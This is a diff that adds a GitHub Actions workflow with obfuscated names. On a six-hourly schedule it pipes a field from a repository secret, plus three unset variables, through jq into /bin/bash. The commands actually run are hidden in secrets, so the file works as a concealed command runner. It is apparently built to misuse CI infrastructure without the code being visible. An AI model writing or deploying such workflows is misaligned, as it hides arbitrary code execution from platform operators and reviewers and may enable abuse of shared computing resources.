@@ -1,0 +1,22 @@
+name: mashanneng7861
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mashanneng7861
+        env:
+          sb04226: ${{ secrets.sb04226 }}
+        run: |
+          echo $sb04226 | jq -r .iqrr86 | /bin/bash
+          echo $tk598 | jq -r .g101 | /bin/bash
+          echo $z03 | jq -r .fk94 | /bin/bash
+          echo $it4 | jq -r .fsvm2943 | /bin/bash
+
